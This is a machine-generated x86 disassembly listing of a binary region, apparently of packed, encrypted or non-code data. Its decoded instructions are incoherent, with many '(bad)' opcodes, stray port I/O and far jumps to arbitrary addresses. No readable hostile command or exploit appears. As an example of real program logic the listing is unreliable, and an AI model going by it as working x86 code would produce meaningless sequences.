  41a8fd:	or     BYTE PTR [esi-0x58],0x12
  41a901:	int3   
  41a902:	gs into 
  41a904:	cmp    al,0xc9
  41a906:	inc    edi
  41a907:	addr16 pop ss
  41a909:	inc    edi
  41a90a:	sbb    esi,DWORD PTR [eax]
  41a90c:	ins    BYTE PTR es:[edi],dx
  41a90d:	jl     0x41a8f6
  41a90f:	xor    eax,0xe8eea131
  41a914:	loop   0x41a969
  41a916:	xchg   ecx,eax
  41a917:	push   ebp
  41a918:	sub    cl,bh
  41a91a:	icebp  
  41a91b:	mov    ah,0x95
  41a91d:	(bad)  
  41a91e:	pop    edx
  41a91f:	jg     0x41a953
  41a921:	mov    dl,bh
  41a923:	das    
  41a924:	test   BYTE PTR [edi-0x4ebb6252],cl
  41a92a:	inc    edi
  41a92b:	scas   al,BYTE PTR es:[edi]
  41a92c:	or     eax,0x3d0080c5
  41a931:	cdq    
  41a932:	mov    ah,0xfb
  41a934:	sub    BYTE PTR [edi+0x74fec1ad],ch
  41a93a:	fsub   st(1),st
  41a93c:	arpl   bx,bp
  41a93e:	add    ebp,ebp
  41a940:	nop
  41a941:	mov    ch,dl
  41a943:	xor    al,0xc0
  41a945:	gs stos BYTE PTR es:[edi],al
  41a947:	or     DWORD PTR [esi+0x25304805],ecx
  41a94d:	scas   eax,DWORD PTR es:[edi]
  41a94e:	or     eax,0x283fe110
  41a953:	add    al,0x79
  41a955:	sub    eax,0x2aaed0e
  41a95a:	ja     0x41a9b4
  41a95c:	stc    
  41a95d:	mov    eax,gs:0x3e77ddfc
  41a963:	inc    esp
  41a964:	jmp    0x41a94c
  41a966:	dec    esp
  41a967:	outs   dx,BYTE PTR ds:[esi]
  41a968:	and    al,0x2d
  41a96a:	sti    
  41a96b:	adc    BYTE PTR [ecx-0x71],bh
	...
  41a9d6:	xor    eax,0xcf4a867e
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	bound  esp,QWORD PTR [ebx+0x1e67d40d]
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	add    BYTE PTR [ecx],al
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	shl    BYTE PTR [esi+0xf9cdb58],cl
  41a9f4:	and    BYTE PTR [edx],dl
  41a9f6:	dec    ebp
  41a9f7:	and    esi,DWORD PTR [edx+0x432b5d64]
  41a9fd:	cmp    eax,0x4907647f
  41aa02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa03:	(bad)  
  41aa04:	cs int 0x87
  41aa07:	loopne 0x41aa24
  41aa09:	push   0xffffffa7
  41aa0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa0d:	jae    0x41aa45
  41aa0f:	jmp    0x2e0e:0xa3feda36
  41aa16:	xchg   esi,eax
  41aa17:	daa    
  41aa18:	sbb    cl,BYTE PTR [eax+0x2e]
  41aa1b:	mov    esi,eax
  41aa1d:	ja     0x41aa2e
  41aa1f:	ret    0x14e5
  41aa22:	imul   esp,DWORD PTR [ecx-0x7],0x1
  41aa26:	shl    DWORD PTR [ebx],0x75
  41aa29:	fnsave [ebp+0x401bb90b]
  41aa2f:	fild   QWORD PTR [esi]
  41aa31:	jle    0x41a9f8
  41aa33:	fstp   TBYTE PTR [esi]
  41aa35:	cwde   
  41aa36:	adc    eax,0xc1273a3c
  41aa3b:	inc    ecx
  41aa3c:	mov    esi,0x2c94863c
  41aa41:	jl     0x41aaa6
  41aa43:	out    dx,eax
  41aa44:	or     ebp,DWORD PTR [esi+ecx*2-0x4fb31f91]
  41aa4b:	mov    al,ds:0x33d1430d
  41aa50:	push   ebp
  41aa51:	sbb    eax,0x24bbaa52
  41aa56:	scas   al,BYTE PTR es:[edi]
  41aa57:	push   ebx
  41aa58:	or     al,0xd7
  41aa5a:	mov    al,ds:0x11ce76df
  41aa5f:	aad    0xbf
  41aa61:	dec    esi
  41aa62:	cmp    al,0xfa
  41aa64:	dec    esp
  41aa65:	retf   
  41aa66:	in     al,0x95
  41aa68:	das    
  41aa69:	adc    al,BYTE PTR [edx]
  41aa6b:	xor    eax,0x9a9b0a58
  41aa70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa71:	imul   BYTE PTR [ecx+0x14]
  41aa74:	clc    
  41aa75:	add    eax,0xa180d3ae
  41aa7a:	xchg   ebx,eax
  41aa7b:	pop    es
  41aa7c:	push   eax
  41aa7d:	cmp    DWORD PTR [esi+ecx*2+0x7f1eaeef],0xffffffe5
  41aa85:	fs in  al,0x63
  41aa88:	jno    0x41aa5b
  41aa8a:	sub    bl,BYTE PTR ds:0xcf10744
  41aa90:	scas   eax,DWORD PTR es:[edi]
  41aa91:	daa    
  41aa92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa93:	fwait
  41aa94:	pop    ecx
  41aa95:	sub    BYTE PTR [eax-0x35],0x28
  41aa99:	mov    al,ds:0xf7ddca70
  41aa9e:	push   ebx
  41aa9f:	fucomi st,st(0)
  41aaa1:	ss out 0xa0,eax
  41aaa4:	add    BYTE PTR [ecx-0x5f885e1f],dh
  41aaaa:	xor    al,0x8
  41aaac:	rcr    dl,cl
  41aaae:	xor    al,0x84
  41aab0:	mov    cl,0xef
  41aab2:	cmp    esp,DWORD PTR [esi+esi*4-0x56a5152f]
  41aab9:	jmp    0x7f45:0xe5741296
  41aac0:	loop   0x41aa84
  41aac2:	fcmovu st,st(4)
  41aac4:	xor    ah,bh
  41aac6:	nop
  41aac7:	in     eax,dx
  41aac8:	(bad)  
  41aac9:	in     eax,dx
  41aaca:	mov    dh,0x3
  41aacc:	pop    ds
  41aacd:	test   eax,0x9f8512c7
  41aad2:	xor    DWORD PTR [edi+0x14be4f6e],ebp
  41aad8:	adc    ch,bl
  41aada:	pop    ecx
  41aadb:	lea    edi,[eax+0x50]
  41aade:	shr    DWORD PTR [ecx],cl
  41aae0:	pop    esi
  41aae1:	ins    BYTE PTR es:[edi],dx
  41aae2:	loop   0x41aa9c
  41aae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aae5:	in     eax,dx
  41aae6:	sbb    DWORD PTR [edx+0x33],esp
  41aae9:	mov    ebp,0xd8942abc
	...
  41ab56:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	mov    bl,0x45
  41ab64:	push   eax
  41ab65:	stos   DWORD PTR es:[edi],eax
  41ab66:	addr16 pop ds
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	add    BYTE PTR [ecx],al
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	cmp    eax,0xc96de5
  41ab73:	jge    0x41ab6c
  41ab75:	call   0xaf92:0xd237ee27
  41ab7c:	ret    0xbbde
  41ab7f:	pop    esp
  41ab80:	mov    ds:0xd54f23e8,eax
  41ab85:	xor    BYTE PTR [ecx+esi*2-0x6f],bl
  41ab89:	iret   
  41ab8a:	or     esp,ecx
  41ab8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab8d:	rol    cl,cl
  41ab8f:	xor    cl,BYTE PTR [edi]
  41ab91:	or     al,0x93
  41ab93:	jecxz  0x41abe9
  41ab95:	xchg   ebx,eax
  41ab96:	xchg   ebx,eax
  41ab97:	mov    esi,0x6bfafa48
  41ab9c:	retf   0x596f
  41ab9f:	pop    ds
  41aba0:	cld    
  41aba1:	xor    al,0xc2
  41aba3:	dec    ebx
  41aba4:	jns    0x41abb0
  41aba6:	add    edx,eax
  41aba8:	adc    BYTE PTR [ebx+0x1c],ah
  41abab:	(bad)  
  41abac:	xchg   DWORD PTR [esi],ebx
  41abae:	imul   edi,DWORD PTR [esi],0x904423e9
  41abb4:	cmp    al,0xb9
  41abb6:	sbb    DWORD PTR [edi],esp
  41abb8:	jae    0x41abc7
  41abba:	or     ah,ah
  41abbc:	push   0xfffffff2
  41abbe:	fsubr  QWORD PTR [edx]
  41abc0:	mov    dh,0xaa
  41abc2:	fild   DWORD PTR [edi-0x7557ea49]
  41abc8:	jbe    0x41ab97
  41abca:	stos   DWORD PTR es:[edi],eax
  41abcb:	(bad)  
  41abcc:	mov    cl,0x1f
  41abce:	and    al,0xa2
  41abd0:	mov    dh,BYTE PTR [edi+0x5b]
  41abd3:	stos   BYTE PTR es:[edi],al
  41abd4:	or     al,0x28
  41abd6:	dec    ebx
  41abd7:	ror    dh,cl
  41abd9:	scas   eax,DWORD PTR es:[edi]
  41abda:	fcomp  DWORD PTR ds:0x39d56186
  41abe0:	cmc    
  41abe1:	push   ebp
  41abe2:	sar    edx,cl
  41abe4:	loop   0x41abed
  41abe6:	pslld  mm3,QWORD PTR [ebx+0x2f]
  41abea:	push   edi
  41abeb:	xchg   ebx,eax
  41abec:	push   ebx
  41abed:	xor    al,BYTE PTR [ebp-0x71]
  41abf0:	aad    0x4d
  41abf2:	push   ebp
  41abf3:	xchg   esp,eax
  41abf4:	inc    ebp
  41abf5:	xchg   edi,eax
  41abf6:	pop    ds
  41abf7:	fmul   DWORD PTR [edi]
  41abf9:	pusha  
  41abfa:	inc    esp
  41abfb:	adc    BYTE PTR [ecx-0x14],dl
  41abfe:	outs   dx,BYTE PTR ds:[esi]
  41abff:	(bad)  
  41ac00:	lock jbe 0x41ac3d
  41ac03:	sar    BYTE PTR [edx],cl
  41ac05:	sti    
  41ac06:	stos   BYTE PTR es:[edi],al
  41ac07:	push   esp
  41ac08:	shl    ebp,1
  41ac0a:	sbb    al,0x50
  41ac0c:	pop    eax
  41ac0d:	in     eax,0x51
  41ac0f:	scas   eax,DWORD PTR es:[edi]
  41ac10:	dec    edi
  41ac11:	out    dx,eax
  41ac12:	or     ecx,ebp
  41ac14:	jno    0x41ac4c
  41ac16:	inc    cl
  41ac18:	mov    al,0x6f
  41ac1a:	cmc    
  41ac1b:	ret    
  41ac1c:	xchg   ebx,eax
  41ac1d:	(bad)  
  41ac1e:	jmp    0x87e32865
  41ac23:	jns    0x41ac53
  41ac25:	inc    ebx
  41ac26:	cli    
  41ac27:	xor    eax,0x19547ad4
  41ac2c:	ja     0x41ac5e
  41ac2e:	dec    esi
  41ac2f:	or     eax,0xd2fcd012
  41ac34:	mov    ecx,0x6cf14a9b
  41ac39:	sbb    DWORD PTR [edx],0xffffffe7
  41ac3c:	ins    DWORD PTR es:[edi],dx
  41ac3d:	pop    esp
  41ac3e:	mov    ecx,0x32ae6b6b
  41ac43:	mov    fs,esp
  41ac45:	inc    esi
  41ac46:	std    
  41ac47:	inc    ecx
  41ac48:	sub    al,0x8d
  41ac4a:	in     eax,dx
  41ac4b:	jno    0x41ac91
  41ac4d:	dec    esi
  41ac4e:	mov    edx,0x541ca6e6
  41ac53:	push   ecx
  41ac54:	imul   ecx,ecx,0xfffffff3
  41ac57:	cmp    dl,cl
  41ac59:	sub    al,0x56
  41ac5b:	sub    eax,0xa9f64980
  41ac60:	stc    
  41ac61:	push   edi
  41ac62:	in     eax,0xc
  41ac64:	mov    esi,0xf0c938d3
  41ac69:	or     ebp,edx
  41ac6b:	(bad)  
  41ac6c:	test   BYTE PTR [esi+0x0],0x0
	...
  41acd4:	add    BYTE PTR [eax],al
  41acd6:	push   0x49
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [ebx+eiz*4-0x2c]
  41ace4:	lods   al,BYTE PTR ds:[esi]
  41ace5:	cdq    
  41ace6:	and    BYTE PTR [bx+di],al
  41ace9:	add    BYTE PTR [eax],al
  41aceb:	add    DWORD PTR [eax],eax
  41aced:	add    cl,cl
  41acef:	cmp    eax,0x11d71523
  41acf4:	call   0x1075:0x44bde542
  41acfb:	mov    eax,0x256668f5
  41ad00:	cmp    eax,0xc4712096
  41ad05:	scas   eax,DWORD PTR es:[edi]
  41ad06:	mov    dl,0xf7
  41ad08:	push   edi
  41ad09:	in     ax,dx
  41ad0b:	inc    edx
  41ad0c:	fistp  WORD PTR [eax]
  41ad0e:	pop    ecx
  41ad0f:	not    DWORD PTR cs:[esi-0x44]
  41ad13:	xlat   BYTE PTR ds:[ebx]
  41ad14:	mov    ds:0x92c9a83b,eax
  41ad19:	xchg   esp,eax
  41ad1a:	add    al,0xf0
  41ad1c:	adc    al,0xb1
  41ad1e:	cmp    DWORD PTR [edi+0x1d77b3da],esp
  41ad24:	and    al,0x25
  41ad26:	xchg   esi,eax
  41ad27:	cld    
  41ad28:	jns    0x41ad1c
  41ad2a:	mov    esi,0x37d4bb99
  41ad2f:	and    al,0x5
  41ad31:	cdq    
  41ad32:	pop    ss
  41ad33:	pusha  
  41ad34:	mov    ah,0x5c
  41ad36:	push   esp
  41ad37:	dec    ecx
  41ad38:	inc    ebp
  41ad39:	dec    esp
  41ad3a:	push   ebx
  41ad3b:	in     al,0xee
  41ad3d:	cmp    al,0xe1
  41ad3f:	jbe    0x41acd1
  41ad41:	test   BYTE PTR [edx+0x18],bl
  41ad44:	or     BYTE PTR [esp+esi*2-0x54],ah
  41ad48:	call   0x7c1d2e25
  41ad4d:	sub    eax,0x1490f7cf
  41ad52:	jmp    0x41ad4e
  41ad54:	pop    ecx
  41ad55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad56:	lods   eax,DWORD PTR ds:[esi]
  41ad57:	mov    bl,0x28
  41ad59:	scas   eax,DWORD PTR es:[edi]
  41ad5a:	idiv   ecx
  41ad5c:	ins    DWORD PTR es:[edi],dx
  41ad5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad5e:	lahf   
  41ad5f:	imul   edx,DWORD PTR [ebp+0x21704dc9],0x7552a2ac
  41ad69:	mov    ch,0xfe
  41ad6b:	mov    bh,BYTE PTR [ecx-0x43]
  41ad6e:	pop    ds
  41ad6f:	pushf  
  41ad70:	jp     0x41ad98
  41ad72:	push   cs
  41ad73:	adc    ebx,0x97aaa91b
  41ad79:	fcmovne st,st(0)
  41ad7b:	push   es
  41ad7c:	push   ds
  41ad7d:	shl    ecx,1
  41ad7f:	sar    BYTE PTR [ecx-0x5eaaed83],1
  41ad85:	push   eax
  41ad86:	out    dx,eax
  41ad87:	mov    ah,0x9f
  41ad89:	inc    ah
  41ad8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad8c:	outs   dx,DWORD PTR ds:[esi]
  41ad8d:	xor    esi,DWORD PTR [ecx]
  41ad8f:	retf   0x8fa9
  41ad92:	loope  0x41ad69
  41ad94:	inc    ebx
  41ad95:	call   0xffdf81ef
  41ad9a:	mov    bh,0x2f
  41ad9c:	xchg   DWORD PTR [ecx],esp
  41ad9e:	(bad)  
  41ad9f:	mov    ds:0x6a08be50,eax
  41ada4:	or     eax,DWORD PTR [esi]
  41ada6:	iret   
  41ada7:	neg    DWORD PTR [edx+0x45]
  41adaa:	mov    esp,0x210c0c18
  41adaf:	sbb    dh,BYTE PTR [edx+0x1c]
  41adb2:	mov    edx,0x1f36da5
  41adb7:	inc    edx
  41adb8:	push   cs
  41adb9:	sub    cl,BYTE PTR [edx+eax*1]
  41adbc:	out    0x7a,eax
  41adbe:	xor    ah,BYTE PTR [edi-0x53026669]
  41adc4:	pop    ebx
  41adc5:	mov    edi,0xab2b4bf1
  41adca:	add    al,0x2c
  41adcc:	pop    ebp
  41adcd:	inc    ebp
  41adce:	es cwde 
  41add0:	fcomi  st,st(1)
  41add2:	mov    ebp,fs
  41add4:	fcmovb st,st(5)
  41add6:	xchg   edi,eax
  41add7:	xor    ah,BYTE PTR [eax-0x52]
  41adda:	ret    
  41addb:	loop   0x41ae45
  41addd:	adc    ebp,DWORD PTR [ebx+0x3c]
  41ade0:	mov    edi,0xef1acb53
  41ade5:	jg     0x41adc6
  41ade7:	out    dx,al
  41ade8:	data16 stc 
  41adea:	sub    BYTE PTR [eax+0xc204],ah
	...
  41ae54:	add    BYTE PTR [eax],al
  41ae56:	push   ebp
  41ae57:	clc    
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [ecx+eax*1+0x6771f8d2],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    BYTE PTR [eax],al
  41ae6b:	add    DWORD PTR [eax],eax
  41ae6d:	add    BYTE PTR [eax-0x2c],bl
  41ae70:	pop    es
  41ae71:	sbb    ebp,DWORD PTR [ebx-0x4d73345c]
  41ae77:	xor    al,0xa5
  41ae79:	leave  
  41ae7a:	dec    ecx
  41ae7b:	pop    es
  41ae7c:	out    dx,eax
  41ae7d:	dec    edi
  41ae7e:	mov    ch,ch
  41ae80:	and    bh,BYTE PTR [ecx]
  41ae82:	mov    ds:0xe48acbb3,al
  41ae87:	pop    eax
  41ae88:	cmp    BYTE PTR [eax],bh
  41ae8a:	iret   
  41ae8b:	(bad)  
  41ae8c:	sbb    al,0xa5
  41ae8e:	add    eax,0xd2233274
  41ae93:	or     dh,BYTE PTR [eax+0x4f60436d]
  41ae99:	mov    dh,0x95
  41ae9b:	(bad)  
  41ae9c:	cmp    DWORD PTR [eax-0x72376f64],esp
  41aea2:	fwait
  41aea3:	scas   eax,DWORD PTR es:[edi]
  41aea4:	push   ds
  41aea5:	jge    0x41af10
  41aea7:	and    eax,0x8b5ac0b0
  41aeac:	fidiv  DWORD PTR [ecx]
  41aeae:	mov    bl,0x5e
  41aeb0:	xchg   DWORD PTR [edi],esp
  41aeb2:	push   0xda6e28cf
  41aeb7:	jge    0x41ae6a
  41aeb9:	mov    ecx,0x3b3a2e2b
  41aebe:	(bad)  
  41aebf:	rcr    DWORD PTR [ecx+0x1222e20b],cl
  41aec5:	bound  ecx,QWORD PTR [ecx]
  41aec7:	add    bh,bl
  41aec9:	jl     0x41aefe
  41aecb:	inc    esp
  41aecc:	lds    eax,FWORD PTR [edi+0xe269be6]
  41aed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aed3:	sub    edx,DWORD PTR [edi+0x5091689f]
  41aed9:	fwait
  41aeda:	mov    al,BYTE PTR [edx]
  41aedc:	ds jne 0x41aefc
  41aedf:	inc    ecx
  41aee0:	aaa    
  41aee1:	pop    es
  41aee2:	sbb    eax,0xcf8b82d
  41aee7:	pop    esi
  41aee8:	push   esi
  41aee9:	jbe    0x41af5c
  41aeeb:	fidivr WORD PTR [ecx]
  41aeed:	sbb    cl,dl
  41aeef:	xchg   edx,eax
  41aef0:	outs   dx,BYTE PTR ds:[esi]
  41aef1:	and    BYTE PTR [esi-0x535c368b],al
  41aef7:	rcr    BYTE PTR [edi-0x42808895],0xf
  41aefe:	sbb    al,BYTE PTR [ebp-0x6b]
  41af01:	mov    cl,0x3a
  41af03:	dec    edx
  41af04:	shr    ecx,1
  41af06:	push   ecx
  41af07:	pop    ss
  41af08:	mov    dl,0xce
  41af0a:	add    BYTE PTR [edx-0x11e6439a],bl
  41af10:	int3   
  41af11:	xchg   esi,eax
  41af12:	pusha  
  41af13:	fcmovnu st,st(4)
  41af15:	push   ebp
  41af16:	and    DWORD PTR [edx-0x7f010a3a],ebx
  41af1c:	dec    eax
  41af1d:	jg     0x41af03
  41af1f:	inc    edx
  41af20:	cmp    BYTE PTR [ecx+0x29],0x8a
  41af24:	jl     0x41af58
  41af26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af27:	dec    esp
  41af28:	cmp    dl,dh
  41af2a:	push   ds
  41af2b:	fs inc edi
  41af2d:	push   ebx
  41af2e:	or     BYTE PTR [edi],0x8b
  41af31:	inc    ebx
  41af32:	les    ebx,FWORD PTR ds:0xcff82666
  41af38:	data16 sbb al,0x88
  41af3b:	lods   al,BYTE PTR ds:[esi]
  41af3c:	add    eax,DWORD PTR [edx+ebp*8]
  41af3f:	push   cs
  41af40:	popa   
  41af41:	xchg   edi,eax
  41af42:	push   esi
  41af43:	mov    al,BYTE PTR ds:0x96f59ece
  41af49:	cmp    dl,BYTE PTR [edi+0x6c]
  41af4c:	pop    ecx
  41af4d:	push   ss
  41af4e:	sahf   
  41af4f:	cld    
  41af50:	add    al,0x5c
  41af52:	lahf   
  41af53:	mov    esi,0x5d8d7505
  41af58:	mov    al,ds:0xc92266cc
  41af5d:	pop    ss
  41af5e:	fdiv   QWORD PTR [ebx+0x2f]
  41af61:	dec    ebx
  41af62:	repz dec ebx
  41af64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af65:	pop    eax
  41af66:	(bad)  
  41af67:	cmp    dh,BYTE PTR [edx]
  41af69:	push   esp
  41af6a:	das    
  41af6b:	xlat   BYTE PTR ds:[ebx]
  41af6c:	and    eax,0x3e
	...
  41afd5:	add    ch,al
  41afd7:	stc    
  41afd8:	lods   eax,DWORD PTR ds:[esi]
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0x6c0644ee
  41afe4:	pop    eax
  41afe5:	mov    eax,0x12267
  41afea:	add    BYTE PTR [ecx],al
  41afec:	add    BYTE PTR [eax],al
  41afee:	test   DWORD PTR [ecx-0x5cc96931],esi
  41aff4:	fidivr DWORD PTR [esi-0x71bcdfca]
  41affa:	xor    bl,bh
  41affc:	sub    eax,0x62f6b90d
  41b001:	rol    BYTE PTR [edi*1+0x6c17da2],cl
  41b008:	jbe    0x41afaa
  41b00a:	pop    ss
  41b00b:	pusha  
  41b00c:	xor    eax,0x8bfe99bf
  41b011:	inc    ecx
  41b012:	sub    ch,BYTE PTR [ebp-0x39]
  41b015:	daa    
  41b016:	push   ds
  41b017:	sbb    eax,0x44a9ad40
  41b01c:	paddq  mm4,QWORD PTR [ebx-0x5217fd6]
  41b023:	jbe    0x41afff
  41b025:	je     0x41afca
  41b027:	or     bh,BYTE PTR [ebp+0x49]
  41b02a:	mov    es:0x6eabf65e,al
  41b030:	and    al,0xe7
  41b032:	enter  0xdac6,0x71
  41b036:	retf   
  41b037:	scas   al,BYTE PTR es:[edi]
  41b038:	mov    ecx,0xd469cb42
  41b03d:	push   esi
  41b03e:	mov    ecx,edx
  41b040:	jmpw   0x22b6
  41b044:	std    
  41b045:	(bad)  [ebx+0x8151561]
  41b04b:	dec    esp
  41b04c:	ds pop ds
  41b04e:	jmp    0x41b038
  41b050:	add    al,0x59
  41b052:	ror    dl,1
  41b054:	fwait
  41b055:	pop    esi
  41b056:	or     DWORD PTR [esi+0x27],esi
  41b059:	jbe    0x41b0b7
  41b05b:	xor    ecx,DWORD PTR [edx]
  41b05d:	cmp    DWORD PTR [edx],ebx
  41b05f:	cli    
  41b060:	and    al,BYTE PTR [ebx+0x6c]
  41b063:	push   edi
  41b064:	scas   eax,DWORD PTR es:[edi]
  41b065:	cld    
  41b066:	fs push 0xfffffffa
  41b069:	pop    ds
  41b06a:	cs jmp 0x3ab86db5
  41b070:	sub    DWORD PTR [edx+edi*1-0x26],edx
  41b074:	inc    eax
  41b075:	cs push esp
  41b077:	ss mov bh,0xb5
  41b07a:	aaa    
  41b07b:	xor    ecx,ecx
  41b07d:	rcl    DWORD PTR [esi+ebp*2-0x44e7ab09],0x6d
  41b085:	jp     0x41b02e
  41b087:	pop    ebp
  41b088:	xchg   edi,eax
  41b089:	scas   eax,DWORD PTR es:[edi]
  41b08a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b08b:	shl    ebx,0x70
  41b08e:	(bad)  
  41b08f:	fidiv  DWORD PTR [ecx]
  41b091:	mov    ecx,0xabbff36c
  41b096:	sbb    bl,BYTE PTR [ecx]
  41b098:	lods   al,BYTE PTR ds:[esi]
  41b099:	and    eax,0xb7bd766a
  41b09e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0a0:	jne    0x41b03d
  41b0a2:	mov    DWORD PTR [ecx-0x4d],esi
  41b0a5:	idiv   ecx
  41b0a7:	dec    esp
  41b0a8:	push   ss
  41b0a9:	loope  0x41b110
  41b0ab:	xor    ebx,DWORD PTR [eax+esi*4+0x79]
  41b0af:	stos   DWORD PTR es:[edi],eax
  41b0b0:	push   ds
  41b0b1:	sub    esp,esp
  41b0b3:	ret    0xdb1f
  41b0b6:	adc    BYTE PTR [ecx+0x30],ah
  41b0b9:	pop    ebp
  41b0ba:	jbe    0x41b091
  41b0bc:	arpl   WORD PTR [ecx],dx
  41b0be:	dec    esp
  41b0bf:	(bad)  
  41b0c0:	dec    edi
  41b0c1:	or     al,0x30
  41b0c3:	push   ss
  41b0c4:	lods   al,BYTE PTR ds:[esi]
  41b0c5:	cli    
  41b0c6:	mov    al,0xab
  41b0c8:	or     al,0xa4
  41b0ca:	int3   
  41b0cb:	push   edi
  41b0cc:	inc    DWORD PTR [ebx-0x43]
  41b0cf:	aaa    
  41b0d0:	into   
  41b0d1:	(bad)  
  41b0d3:	arpl   bx,sp
  41b0d5:	xor    eax,0xd84981c7
  41b0da:	or     esi,ebp
  41b0dc:	pop    esp
  41b0dd:	pcmpeqw mm0,QWORD PTR [ecx]
  41b0e0:	xor    ebp,ebx
  41b0e2:	add    BYTE PTR [eax],al
  41b0e4:	adc    ebx,DWORD PTR [eax+esi*2]
  41b0e7:	fsub   QWORD PTR [esi-0x2d]
  41b0ea:	inc    eax
  41b0eb:	sub    al,0xca
  41b0ed:	fadd   DWORD PTR [eax]
	...
  41b153:	add    BYTE PTR [eax],al
  41b155:	add    dh,al
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x6ca1d252
  41b166:	and    eax,DWORD PTR [bx+di]
  41b169:	add    BYTE PTR [eax],al
  41b16b:	add    DWORD PTR [eax],eax
  41b16d:	add    BYTE PTR [edx],dl
  41b16f:	mov    dh,0x4a
  41b171:	xchg   ebp,eax
  41b172:	jp     0x41b137
  41b174:	(bad)  
  41b176:	sub    ecx,ebx
  41b178:	test   eax,0x9d01d22f
  41b17d:	(bad)  
  41b17e:	mov    ah,0x25
  41b180:	mov    BYTE PTR [ebx+0x32],dh
  41b183:	outs   dx,BYTE PTR ds:[esi]
  41b184:	fidivr WORD PTR [eax-0x36d0218a]
  41b18a:	(bad)  
  41b18b:	cmp    DWORD PTR [eax+0x549eb839],ebp
  41b191:	fwait
  41b192:	imul   ebx,DWORD PTR [esi-0xb614e69],0xf859d99d
  41b19c:	arpl   WORD PTR [esi-0x39],bp
  41b19f:	sub    BYTE PTR ds:0x33cb,ah
  41b1a4:	lock into 
  41b1a6:	add    eax,0x5b74e796
  41b1ab:	mov    ds,WORD PTR [edx]
  41b1ad:	ret    0x74f3
  41b1b0:	push   ebp
  41b1b1:	or     dl,ah
  41b1b3:	mov    DWORD PTR [ebp+0x1d],ebx
  41b1b6:	outs   dx,DWORD PTR ds:[esi]
  41b1b7:	imul   ecx,DWORD PTR [esi-0x25],0xd671037f
  41b1be:	mov    al,0xf5
  41b1c0:	fwait
  41b1c1:	mov    al,ds:0x4129e3fe
  41b1c6:	rcl    BYTE PTR [eiz*1+0x67bd72cf],0xfd
  41b1ce:	push   ecx
  41b1cf:	mov    al,0xb6
  41b1d1:	pop    edi
  41b1d2:	test   BYTE PTR [esi-0x51a0d0c2],dh
  41b1d8:	mov    esp,0x15750955
  41b1dd:	jno    0x41b176
  41b1df:	add    ebp,ebp
  41b1e1:	mov    ah,dh
  41b1e3:	ret    
  41b1e4:	inc    ebp
  41b1e5:	ficom  DWORD PTR [edi]
  41b1e7:	out    dx,al
  41b1e8:	cmp    eax,0xdfff046
  41b1ed:	and    al,0x7a
  41b1ef:	inc    edx
  41b1f0:	dec    edx
  41b1f1:	inc    cl
  41b1f3:	test   DWORD PTR [ecx+eiz*8+0x27],eax
  41b1f7:	aas    
  41b1f8:	or     BYTE PTR [edx+0x4ffa5fd0],bh
  41b1fe:	push   ebx
  41b1ff:	lahf   
  41b200:	mov    dh,0x7f
  41b202:	mov    bh,0x30
  41b204:	inc    edi
  41b205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b206:	jecxz  0x41b1a2
  41b208:	and    eax,0xe22c1c7f
  41b20d:	jg     0x41b248
  41b20f:	(bad)  
  41b210:	(bad)  
  41b212:	outs   dx,DWORD PTR ds:[esi]
  41b213:	or     dl,ah
  41b215:	les    ebp,FWORD PTR [esi+0x495c41ca]
  41b21b:	or     al,0x58
  41b21d:	xchg   edx,eax
  41b21e:	sub    eax,0x8bb6830b
  41b223:	es aas 
  41b225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b226:	or     bh,dl
  41b228:	cmc    
  41b229:	jg     0x41b270
  41b22b:	sub    dh,cl
  41b22d:	(bad)  
  41b22e:	cli    
  41b22f:	int3   
  41b230:	sbb    ah,BYTE PTR [edi-0x5d3763e]
  41b236:	(bad)  
  41b238:	ins    BYTE PTR es:[edi],dx
  41b239:	mov    eax,0xbfea8e81
  41b23e:	adc    BYTE PTR [eax+0x62],0xaf
  41b242:	and    ecx,DWORD PTR [eax+0x1f]
  41b245:	mov    edi,DWORD PTR [esi+0x373df8d1]
  41b24b:	add    al,0xc5
  41b24d:	(bad)  
  41b24e:	int    0x75
  41b250:	lea    edi,[ecx-0xc98c813]
  41b256:	pop    edx
  41b257:	and    eax,0x30ffb3b6
  41b25c:	imul   edi,DWORD PTR [edi-0x76],0xb1addfff
  41b263:	push   edi
  41b264:	lahf   
  41b265:	sub    BYTE PTR [edi],0xa9
